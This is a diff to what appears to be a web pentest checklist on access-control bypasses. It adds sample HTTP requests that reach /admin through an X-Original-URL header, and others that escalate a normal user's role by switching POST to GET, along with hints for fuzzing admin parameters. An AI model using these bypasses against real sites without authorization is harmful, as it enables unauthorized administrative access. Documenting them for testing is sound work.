@@ -37,15 +37,26 @@
 	- /login, /profile or any page with ability to interact with user's data
 	- fuzz for hidden parameters in the url or request body using arjun
 		- ?role=admin, ?admin=True, ?priv=high
-7. bypass deny access for unauthenticated user when accessing authenticated path (PATH based)
+7. bypass deny access for unauthenticated user when accessing authenticated path
 	- try supply a new header like: X-Original-URL or X-Rewrite-URL
 	```
-	GET /admin HTTP/1.1
-	Host: www.example.com 			403 Denied Access
+	GET /admin HTTP/1.1			403 Denied Access
 	Session: normalusertoken
 	```
 	```
 	GET / HTTP/1.1
-	X-Original-URL: /admin          	200 Access Granted
+ 	X-Original-URL: /admin			200 Access Granted
 	Session: normalusertoken
 	```
+ 8. bypass unauthorized action using different HTTP method
+	- instead of POST, try GET or PUT
+	```
+ 	POST /admin-roles HTTP/1.1
+ 	Session: normalusertoken		403 Unauthorized
+
+ 	username=normaluser&action=upgrade
+ 	```
+ 	```
+  	GET /admin-roles?username=normaluser&action=upgrade		200 Success
+  	Session: normalusertoken
+  	```
